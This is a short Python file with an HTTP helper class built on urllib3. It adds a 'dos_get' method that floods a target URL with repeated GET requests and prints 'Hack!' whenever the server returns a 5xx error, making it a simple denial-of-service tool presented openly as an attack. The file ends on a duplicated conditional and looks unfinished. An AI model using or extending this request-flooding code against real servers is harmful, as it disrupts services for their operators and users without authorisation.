import urllib3
import certifi
import json

class Request:
    def __init__(self, url):
        self.http = urllib3.PoolManager(ca_certs=certifi.where())
        self.url = url
    def get(self, method='GET', fields={}):
        site = self.http.request(method=method, url=self.url, fields=fields)
        return site
    def post(self, method='POST', fields={}):
        site = self.http.request(method=method, url=self.url, fields=fields)
        return site
    def json(self, fields, method='POST'):
        encoded_data = json.dumps(fields).encode('utf-8')
        site = self.http.request(
            method=method,
            url=self.url,
            body=encoded_data,
            headers={'Content-Type': 'application/json'}
        )

        return json.loads(site.data.decode('utf-8'))['json']
    def dos_get(self, packets, method='GET'):
        n1 = 0
        for i in range(packets):
            site = self.http.request(
                method=method,
                url=self.url
            )
            if n1==0:
                str1 = '|*    |'
                n1 += 1
            elif n1==1:
                str1 = '|  *  |'
                n1 += 1
            elif n1==2:
                str1 = '|    *|'
                n1 = 0
            if site.status in range(500, 599):
                str2 = '  Hack!'
            else:
                str2 = '  '
            print(i, '% ', '/ ', packets, '%', ' -___{}___-'.format(site.status), str1, str2)

            if site.status in range(500, 599):
                str2 = '  Hack!'
